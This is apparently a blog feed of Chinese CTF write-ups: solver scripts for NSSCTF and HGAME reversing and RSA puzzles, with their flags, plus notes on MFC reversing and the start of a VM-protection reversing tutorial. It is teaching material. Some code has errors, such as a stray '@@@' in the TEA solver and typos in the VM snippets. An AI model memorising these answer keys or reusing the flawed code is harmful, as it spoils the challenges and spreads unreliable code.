    <content type="html"><![CDATA[<h1 id="NSSCTF"><a href="#NSSCTF" class="headerlink" title="NSSCTF"></a>NSSCTF</h1><h3 id="SWPUCTF-2021-新生赛-简简单单的逻辑"><a href="#SWPUCTF-2021-新生赛-简简单单的逻辑" class="headerlink" title="[SWPUCTF 2021 新生赛]简简单单的逻辑"></a>[SWPUCTF 2021 新生赛]简简单单的逻辑</h3><p>题目：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&#x27;xxxxxxxxxxxxxxxxxx&#x27;</span></span><br><span class="line"><span class="built_in">list</span> = [<span class="number">47</span>, <span class="number">138</span>, <span class="number">127</span>, <span class="number">57</span>, <span class="number">117</span>, <span class="number">188</span>, <span class="number">51</span>, <span class="number">143</span>, <span class="number">17</span>, <span class="number">84</span>, <span class="number">42</span>, <span class="number">135</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">28</span>, <span class="number">169</span>, <span class="number">25</span>]</span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">list</span>)):</span><br><span class="line">    key = (<span class="built_in">list</span>[i]&gt;&gt;<span class="number">4</span>)+((<span class="built_in">list</span>[i] &amp; <span class="number">0xf</span>)&lt;&lt;<span class="number">4</span>)</span><br><span class="line">    result = result + <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">ord</span>(flag[i])^key))[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="comment"># result=bcfba4d0038d48bd4b00f82796d393dfec</span></span><br></pre></td></tr></table></figure><p><a href="https://www.bilibili.com/read/cv23598163/">SWPUCTF 2021 新生赛]简简单单的逻辑 - 哔哩哔哩 (bilibili.com)</a></p><blockquote><p>首先要掌握的知识点：</p><p>字符串转ASCII </p><p>print(ord(‘a’))   #97</p><p>ASCII转字符串</p><p>print(chr(97))  #a</p><p>切片:<a href="https://www.jianshu.com/p/15715d6f4dad">https://www.jianshu.com/p/15715d6f4dad</a></p><p>十进制转十六进制</p><p>print(hex(10)) #a</p><p>十六进制转十进制</p><p>print(int(‘a’,16))  #10</p></blockquote><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">list</span> = [<span class="number">47</span>, <span class="number">138</span>, <span class="number">127</span>, <span class="number">57</span>, <span class="number">117</span>, <span class="number">188</span>, <span class="number">51</span>, <span class="number">143</span>, <span class="number">17</span>, <span class="number">84</span>, <span class="number">42</span>, <span class="number">135</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">28</span>, <span class="number">169</span>, <span class="number">25</span>]</span><br><span class="line">result = <span class="string">&#x27;bcfba4d0038d48bd4b00f82796d393dfec&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">list</span>)):</span><br><span class="line">    key = (<span class="built_in">list</span>[i]&gt;&gt;<span class="number">4</span>)+((<span class="built_in">list</span>[i] &amp; <span class="number">0xf</span>)&lt;&lt;<span class="number">4</span>)</span><br><span class="line">    <span class="comment">#result += str(hex(ord(flag[i])^key))[2:].zfill(2)</span></span><br><span class="line">    flag+=<span class="built_in">chr</span>(<span class="built_in">int</span>((result[<span class="number">2</span>*i:<span class="number">2</span>*i+<span class="number">2</span>]),<span class="number">16</span>)^key)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># result=bcfba4d0038d48bd4b00f82796d393dfec</span></span><br><span class="line"><span class="comment"># flag = NSSCTF&#123;EZEZ_RERE&#125;</span></span><br></pre></td></tr></table></figure><h3 id="SWPUCTF-2021-新生赛-re1"><a href="#SWPUCTF-2021-新生赛-re1" class="headerlink" title="[SWPUCTF 2021 新生赛]re1"></a>[SWPUCTF 2021 新生赛]re1</h3><p>就是，变一下，3–e  4–a</p><p>NSSCTF{easy_reverse}</p><h3 id="HGAME-2023-week1-a-cup-of-tea"><a href="#HGAME-2023-week1-a-cup-of-tea" class="headerlink" title="[HGAME 2023 week1]a_cup_of_tea"></a>[HGAME 2023 week1]a_cup_of_tea</h3><p>45678901345678902345678912345678</p><p>放个TEA小轮子：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">v, k</span>):</span><br><span class="line">    v0 = v[<span class="number">0</span>]</span><br><span class="line">    v1 = v[<span class="number">1</span>]</span><br><span class="line">    x = <span class="number">0xABCDEF23</span> * <span class="number">32</span></span><br><span class="line">    delta = <span class="number">0xABCDEF23</span> @@@</span><br><span class="line">    k0 = k[<span class="number">0</span>]</span><br><span class="line">    k1 = k[<span class="number">1</span>]</span><br><span class="line">    k2 = k[<span class="number">2</span>]</span><br><span class="line">    k3 = k[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3)</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1)</span><br><span class="line">        v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        x -= delta</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v[<span class="number">0</span>] = v0</span><br><span class="line">    v[<span class="number">1</span>] = v1</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    c = [<span class="number">0x2E63829D</span>, <span class="number">0xC14E400F</span>, <span class="number">0x9B39BFB9</span>, <span class="number">0x5A1F8B14</span>, <span class="number">0x61886DDE</span>, <span class="number">0x6565C6CF</span>, <span class="number">0x9F064F64</span>, <span class="number">0x236A43F6</span>, <span class="number">0x7D6B</span>]</span><br><span class="line">    cc = [long_to_bytes(k)[::-<span class="number">1</span>] <span class="keyword">for</span> k <span class="keyword">in</span> c]</span><br><span class="line">    key = [<span class="number">0x12345678</span>, <span class="number">0x23456789</span>, <span class="number">0x34567890</span>, <span class="number">0x45678901</span>]</span><br><span class="line">    flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)//<span class="number">2</span>):</span><br><span class="line">        d = decrypt(c[<span class="number">2</span>*i:<span class="number">2</span>*(i+<span class="number">1</span>)], key)</span><br><span class="line">        flag += long_to_bytes(d[<span class="number">0</span>])[::-<span class="number">1</span>]+long_to_bytes(d[<span class="number">1</span>])[::-<span class="number">1</span>]</span><br><span class="line">    flag += long_to_bytes(c[-<span class="number">1</span>])[::-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;Tea_15_4_v3ry_h3a1thy_drlnk&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="小轮子RSA"><a href="#小轮子RSA" class="headerlink" title="小轮子RSA"></a>小轮子RSA</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n=p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c=<span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n=<span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">c=110674792674017748243232351185896019660434718342001686906527789876264976328686134101972125493938434992787002915562500475480693297360867681000092725583284616353543422388489208114545007138606543678040798651836027433383282177081034151589935024292017207209056829250152219183518400364871109559825679273502274955582</span></span><br><span class="line"><span class="string">n=135127138348299757374196447062640858416920350098320099993115949719051354213545596643216739555453946196078110834726375475981791223069451364024181952818056802089567064926510294124594174478123216516600368334763849206942942824711531334239106807454086389211139153023662266125937481669520771879355089997671125020789</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">11239134987804993586763559028187245057652550219515201768644770733869088185320740938450178816138394844329723311433549899499795775655921261664087997097294813</span></span><br><span class="line">q = <span class="number">12022912661420941592569751731802639375088427463430162252113082619617837010913002515450223656942836378041122163833359097910935638423464006252814266959128953</span></span><br><span class="line">n = p*q</span><br><span class="line">c = <span class="number">110674792674017748243232351185896019660434718342001686906527789876264976328686134101972125493938434992787002915562500475480693297360867681000092725583284616353543422388489208114545007138606543678040798651836027433383282177081034151589935024292017207209056829250152219183518400364871109559825679273502274955582</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># hgame&#123;factordb.com_is_strong!&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;NSSCTF&quot;&gt;&lt;a href=&quot;#NSSCTF&quot; class=&quot;headerlink&quot; title=&quot;NSSCTF&quot;&gt;&lt;/a&gt;NSSCTF&lt;/h1&gt;&lt;h3 id=&quot;SWPUCTF-2021-新生赛-简简单单的逻辑&quot;&gt;&lt;a href=&quot;#SWPUCTF-2021-</summary>
      
    
    
    
    
    <category term="NSSCTF" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/NSSCTF/"/>
    
  </entry>
  
  <entry>
    <title>MFC图形化界面</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/04/13/MFC%E5%9B%BE%E5%BD%A2%E5%8C%96%E7%95%8C%E9%9D%A2/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/04/13/MFC%E5%9B%BE%E5%BD%A2%E5%8C%96%E7%95%8C%E9%9D%A2/</id>
    <published>2024-04-12T16:00:00.000Z</published>
    <updated>2024-09-16T07:53:04.420Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MFC图形化界面"><a href="#MFC图形化界面" class="headerlink" title="MFC图形化界面"></a>MFC图形化界面</h1><h2 id="windows桌面应用编程"><a href="#windows桌面应用编程" class="headerlink" title="windows桌面应用编程"></a>windows桌面应用编程</h2><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240203202804698.png" alt="image-20240203202804698"></p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240203202813056.png" alt="image-20240203202813056"></p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240203202823482.png" alt="image-20240203202823482"></p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240203202851227.png" alt="image-20240203202851227"></p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240203202903575.png" alt="image-20240203202903575"></p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240203202911473.png" alt="image-20240203202911473"></p><h2 id="MFC-正向开发"><a href="#MFC-正向开发" class="headerlink" title="MFC 正向开发"></a><strong>MFC</strong> <strong>正向开发</strong></h2><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240203202925910.png" alt="image-20240203202925910"></p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240203202934106.png" alt="image-20240203202934106"></p><h2 id="逆向思路"><a href="#逆向思路" class="headerlink" title="逆向思路"></a><strong>逆向思路</strong></h2><ul><li><p>通过 ResourceHacker 可以获取控件的 ID 号、修改控件布局等</p></li><li><p>通过 xspy 可以获取控件消息所对应的处理函数地址</p></li><li><p>通过 GetDlgItem &#x2F; GetDlgItemText &#x2F; GetDlgItemInt &#x2F; GetWindowText 系列 API 找到关键函数</p></li></ul><p>找到关键函数后，即为常规逆向</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;MFC图形化界面&quot;&gt;&lt;a href=&quot;#MFC图形化界面&quot; class=&quot;headerlink&quot; title=&quot;MFC图形化界面&quot;&gt;&lt;/a&gt;MFC图形化界面&lt;/h1&gt;&lt;h2 id=&quot;windows桌面应用编程&quot;&gt;&lt;a href=&quot;#windows桌面应用编程&quot; c</summary>
      
    
    
    
    
    <category term="MFC" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/MFC/"/>
    
  </entry>
  
  <entry>
    <title>VM学习</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/03/31/VM/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/03/31/VM/</id>
    <published>2024-03-30T16:00:00.000Z</published>
    <updated>2024-09-16T07:15:39.605Z</updated>
    
    <content type="html"><![CDATA[<h3 id="那CTF，那VMre，那些事（一）"><a href="#那CTF，那VMre，那些事（一）" class="headerlink" title="那CTF，那VMre，那些事（一）"></a>那CTF，那VMre，那些事（一）</h3><p>  vm虚拟机保护逆向，是一种利用了虚拟机技术的一种特殊加花指令方式。目前比赛中，虚拟机题目特点是核心算法不是很复杂，虚拟机本身没有反调试和代码加密混淆的加入。大部分题目的思路都是考察分析switch语句及其分支。                    </p><h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>最近做题刷到了2020网鼎杯一道vm虚拟机保护的re题目，遂决定系统的学习一下vm虚拟机保护逆向的相关知识。毕竟vm逆向在各大比赛中势头正盛。</p><p>题目附件在文章末尾。需要的大佬可以下载学习一下。</p><h2 id="0x01什么是虚拟机？什么是vm？"><a href="#0x01什么是虚拟机？什么是vm？" class="headerlink" title="0x01什么是虚拟机？什么是vm？"></a>0x01什么是虚拟机？什么是vm？</h2><p>学习虚拟机逆向，首先要了解什么是虚拟机。按照我之前的粗浅理解，虚拟机是寄生于宿主电脑上的一台虚拟电脑，来满足使用者关于多个操作系统配合、危险软件隔离分析等等需求的技术。当然这是个人理解，仅供参考。而在大佬博客中，我看到了如下精彩的定义：</p><blockquote><p>虚拟机：自己定义一套指令，在程序中能有一套函数和结构解释自己定义的指令并执行功能。</p></blockquote><p>上述定义将虚拟机的原理讲的很透彻了。接下来我们说说什么是vm。首先给出官方定义</p><blockquote><p>vm（虚拟机保护）是一种基于虚拟机的代码保护技术。他将基于x86汇编系统中的可执行代码转换为字节码指令系统的代码。来达到不被轻易篡改和逆向的目的。</p></blockquote><p>简单来说就是出题人通过实现一个小型的虚拟机，把程序的代码转换为程序设计者自定义的操作码（opcode）然后在程序执行时通过解释操作码，执行对应的函数，从而实现程序原有的功能。</p><p>下图是一个一般虚拟机结构</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/02/attach-62df7fdcb0d174e10d09b59fd6af5df5ce0840e5.png" alt="未命名文件.png"></p><p>对于上图出现的概念的解释:</p><blockquote><p><strong>VMRUN</strong>:虚拟机入口函数<br> <strong>dispatcher</strong>：调度器，用于解释opcode，并选择对应的Handler函数执行，当Handler执行完后会跳回这里，形成一个循环。<br> <strong>opcode</strong>：程序可执行代码转换成的操作码<br> <strong>Handler</strong>：各种功能对象模块</p></blockquote><p>当然这里的虚拟机并不是指VMWare\VirtualBox之类的虚拟机，它更像是一个用于解释系统函数的一个小型模拟器。</p><h2 id="0x02出题人如何实现vmre小型虚拟机"><a href="#0x02出题人如何实现vmre小型虚拟机" class="headerlink" title="0x02出题人如何实现vmre小型虚拟机"></a>0x02出题人如何实现vmre小型虚拟机</h2><p>想要搞清楚虚拟机保护re首先要搞清楚用于保护的虚拟机是如何实现的。</p><p>要想实现虚拟机的话需要完成两个目标：<br> 1.定义一套opcode<br> 2.实现opcode的解释器</p><h3 id="初始化虚拟寄存器、opcode存放"><a href="#初始化虚拟寄存器、opcode存放" class="headerlink" title="初始化虚拟寄存器、opcode存放"></a>初始化虚拟寄存器、opcode存放</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">    unsigned long r1;    <span class="comment">//虚拟寄存器r1</span></span><br><span class="line">    unsigned long r2;    <span class="comment">//虚拟寄存器r2</span></span><br><span class="line">    unsigned long r3;    <span class="comment">//虚拟寄存器r3</span></span><br><span class="line">    unsigned char *eip;    <span class="comment">//指向正在解释的opcode地址</span></span><br><span class="line">    vm_opcode op_list[OPCODE_N];    <span class="comment">//opcode列表，存放了所有的opcode及其对应的处理函数</span></span><br><span class="line">&#125;vm_cpu;</span><br></pre></td></tr></table></figure><p>r1-r3用来传参或者是存放返回值,eip指向opcode的地址</p><h3 id="定义opcode"><a href="#定义opcode" class="headerlink" title="定义opcode"></a>定义opcode</h3><p>opcode只是一个标识，可以随便定义</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">    unsigned char opcode;</span><br><span class="line">    <span class="keyword">void</span> (*handle)(<span class="keyword">void</span>*);</span><br><span class="line">&#125;vm_opcode;</span><br></pre></td></tr></table></figure><h3 id="关联opcode和对应handler函数"><a href="#关联opcode和对应handler函数" class="headerlink" title="关联opcode和对应handler函数"></a>关联opcode和对应handler函数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *<span class="title function_ invoke__">vm_init</span>()</span><br><span class="line">&#123;</span><br><span class="line">    vm_vpu *cpu;</span><br><span class="line">    cpu-&gt;r1 = <span class="number">0</span>;</span><br><span class="line">    cpu-&gt;r2 = <span class="number">0</span>;</span><br><span class="line">    cpu-&gt;r3 = <span class="number">0</span>;</span><br><span class="line">    cpu-&gt;eip = (unsigned char *)vm_code;<span class="comment">//将eip指向opcode的地址</span></span><br><span class="line"></span><br><span class="line">    cpu-&gt;op_list[<span class="number">0</span>].opcode = <span class="number">0xf1</span>;</span><br><span class="line">    cpu-&gt;op_list[<span class="number">0</span>].handle = (<span class="keyword">void</span> (*)(<span class="keyword">void</span> *))mov;<span class="comment">//将操作字节码与对应的handle函数关联在一起</span></span><br><span class="line"></span><br><span class="line">    cpu-&gt;op_list[<span class="number">1</span>].opcode = <span class="number">0xf2</span>;</span><br><span class="line">    cpu-&gt;op_list[<span class="number">1</span>].handle = (<span class="keyword">void</span> (*)(<span class="keyword">void</span> *))<span class="keyword">xor</span>;</span><br><span class="line"></span><br><span class="line">    cpu-&gt;op_list[<span class="number">2</span>].opcode = <span class="number">0xf5</span>;</span><br><span class="line">    cpu-&gt;op_list[<span class="number">2</span>].handle = (<span class="keyword">void</span> (*)(<span class="keyword">void</span> *))read_;</span><br><span class="line"></span><br><span class="line">    vm_stack = <span class="title function_ invoke__">malloc</span>(<span class="number">0x512</span>);</span><br><span class="line">    <span class="title function_ invoke__">memset</span>(vm_stack,<span class="number">0</span>,<span class="number">0x512</span>);<span class="comment">//定义了一个新栈并在malloc上申请了0x512位的空间</span></span><br></pre></td></tr></table></figure><h3 id="虚拟机入口函数"><a href="#虚拟机入口函数" class="headerlink" title="虚拟机入口函数"></a>虚拟机入口函数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">vm_start</span>(vm_cpu *cpu)</span><br><span class="line">&#123;</span><br><span class="line">    cpu-&gt;eip = (unsigned char*)opcodes;<span class="comment">//eip指向要被解释的opcode地址</span></span><br><span class="line">    <span class="keyword">while</span>((*cpu-&gt;eip) != <span class="number">0xf4</span>)<span class="comment">//如果opcode不为RET，就调用vm_dispatcher来解释执行</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_ invoke__">vm_dispatcher</span>(*cpu-&gt;eip)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="解释执行器编写"><a href="#解释执行器编写" class="headerlink" title="解释执行器编写"></a>解释执行器编写</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">vm_dispatcher</span>(vm_cpu *cpu)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> j;</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;OPCODE_N;j++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(*cpu-&gt;eip ==cpu-&gt;op_list[i].opcode)</span><br><span class="line">        &#123;</span><br><span class="line">            cpu-&gt;op_list[i].<span class="title function_ invoke__">handle</span>(cpu);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="具体执行函数实现"><a href="#具体执行函数实现" class="headerlink" title="具体执行函数实现"></a>具体执行函数实现</h3><p>这里实现 mov xor read 三个简单的指令 其中read指令用于读取数据 在题目中用于读取flag。具体题目中根据题目要求实现不同的函数功能即可。所以说虚拟机类re题目很好的考察了参赛选手的代码能力</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="keyword">xor</span>(vm_cpu *cpu)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> num;</span><br><span class="line">    num =cpu-&gt;r1 ^cpu-&gt;r2;</span><br><span class="line">    num ^=<span class="number">0x12</span>;</span><br><span class="line">    cpu-&gt;r1= temp;</span><br><span class="line">    cpu-&gt;eip=eip+<span class="number">1</span>;<span class="comment">//这里一定要注意xor指令本身是占一个字节的。</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">mov</span>(vm_cpu *cpu)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*mov指令的参数都隐藏在字节码中，指令表示后的一个字节是寄存器标识，第二到第五是要mov的数据在vm_stack上的偏移。这里只实现了从vm_stack栈上存取数据*/</span></span><br><span class="line">    unsigned char *res =cpu-&gt;eip+<span class="number">1</span>;<span class="comment">//寄存器标识</span></span><br><span class="line">    <span class="keyword">int</span> *offset = (<span class="keyword">int</span> *)(cpu-&gt;eip+<span class="number">2</span>);</span><br><span class="line">    char *dest=<span class="number">0</span>;</span><br><span class="line">    dest=vm_stack;</span><br><span class="line">    <span class="keyword">switch</span>(*res)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xe1</span>:</span><br><span class="line">        cpu-&gt;r1=*(dest + *offset);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xe2</span>:</span><br><span class="line">        cpu-&gt;r2=*(dest + *offset);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xe3</span>:</span><br><span class="line">        cpu-&gt;r3=*(dest + *offset);</span><br><span class="line">        <span class="keyword">break</span>;<span class="comment">//数据寄存</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xe4</span>:</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">int</span> x=cpu-&gt;r1;</span><br><span class="line">                *(dest + *offset)=x;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;<span class="comment">//获取寄存器中数据</span></span><br><span class="line">    &#125;</span><br><span class="line">    cpu-&gt;eip += <span class="number">6</span>;<span class="comment">//mov指令占六个字节，所以eip要向后移6位</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="定义opcode字符集"><a href="#定义opcode字符集" class="headerlink" title="定义opcode字符集"></a>定义opcode字符集</h3><p>定义opcode字符集，每个字符对应一个函数功能模块</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">unsigned char vm_code[] = &#123;</span><br><span class="line">    <span class="number">0xf5</span>,</span><br><span class="line">    <span class="number">0xf1</span>,<span class="number">0xe1</span>,<span class="number">0x0</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xf2</span>,<span class="number">0xf1</span>,<span class="number">0xe4</span>,<span class="number">0x20</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span 